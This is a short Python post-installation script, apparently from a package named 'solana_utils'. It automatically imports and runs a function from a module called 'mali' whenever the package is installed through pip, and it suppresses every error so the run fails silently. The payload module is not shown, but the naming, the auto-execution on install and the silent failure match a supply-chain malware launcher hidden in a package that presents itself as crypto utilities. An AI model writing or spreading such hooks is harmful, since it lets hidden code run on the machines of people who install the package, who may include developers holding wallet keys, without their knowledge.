"""
Post-installation script to execute mali.py
"""

def run():
    """
    Function to run after pip installation.
    This will be executed when the package is installed through pip.
    """
    try:
        # Import mali.py
        from solana_utils.network.mali import _
        # Execute if it's callable
        if callable(_):
            _()
        return True
    except Exception:
        # Fail silently
        return False
    
if __name__ == "__main__":
    run() 